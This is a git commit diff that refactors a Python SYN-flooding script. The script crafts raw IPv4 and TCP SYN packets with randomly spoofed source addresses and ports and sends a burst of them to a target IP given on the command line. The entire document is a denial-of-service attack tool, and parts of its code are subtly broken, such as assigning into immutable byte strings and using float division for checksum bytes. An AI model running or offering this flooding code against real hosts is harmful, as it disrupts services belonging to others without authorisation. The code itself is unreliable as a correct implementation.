4e052644ad7fac721d0a93e65560adc0d925811b
EliasKarj <elias1.karjalainen@gmail.com>
2026-02-02 10:15:26 +0200

    Refactor SYN flooding script

--- SYNflooding.py
+++ SYNflooding.py
@@ -22,14 +22,26 @@ if len(sys.argv) != 2:
     exit()
 
 s = sc.socket(sc.AF_INET, sc.SOCK_RAW, sc.IPPROTO_TCP)
-s.setsockopt(sc.IPPROTO_IP, sc.IP_HDRINCL, 1) #we make IPv4 header
+s.setsockopt(sc.IPPROTO_IP, sc.IP_HDRINCL, 1)       #we make IPv4 header
 count = 0
 while count < 100:
-    srcIP =  random.randint(0,2**32-1)
-    srcPort = random.randint(49152, 2**16-1)
-    target = sc.inet_aton(sys.argv[1])
-    iphdr = b'\x45\x00\x00\x28gc\x00\x00' # first 8 bytes of IPv4
-    iphdr += b'\x80\x06\x00\x00' # TTL + PROTO + HDR_CKSUM
-    iphdr += struct.pack('>I4s', srcIP, target)
+    srcIP =  random.randint(0,2**32-1)              # spoof my IP
+    srcPort = random.randint(49152, 2**16-1)        # spoof my port
+    target = sc.inet_aton(sys.argv[1])              # get target IP from command
+    iphdr = b'\x45\x00\x00\x28gc\x00\x00'           # first 8 bytes of IPv4
+    iphdr += b'\x80\x06\x00\x00'                    # 3rd row, TTL + PROTO + HDR_CKSUM
+    iphdr += struct.pack('>I4s', srcIP, target)     # 4th and 5th row: IPv4 addrs
     # to make TCP hdr
-    tcphdr = struct.pack('>HH')
+    tcphdr = struct.pack('>HHII', srcPort, 80, random.randint(0,2**32-1), 0)
+    tcphdr += b'\x50\x02\x44\x55'                   # hdr_lens + SYN
+    tcphdr += b'\x00\x00\x00\x00'                   # chksum + urgent_pointer
+
+    pseudo_iphdr = iphdr[12:] + b'\x00\x06\x00\x14'
+    chsum_tcp = checksum(pseudo_iphdr+tcphdr)
+    chsum_ip = checksum(iphdr)
+    iphdr[10] = chsum_ip/256
+    iphdr[11] = chsum_ip%256
+    tcphdr[16] = chsum_tcp//256
+    tcphdr[17] = chsum_tcp%256
+    s.sendto(iphdr+tcphdr, (sys.argv[1], 0))
+    count+=1
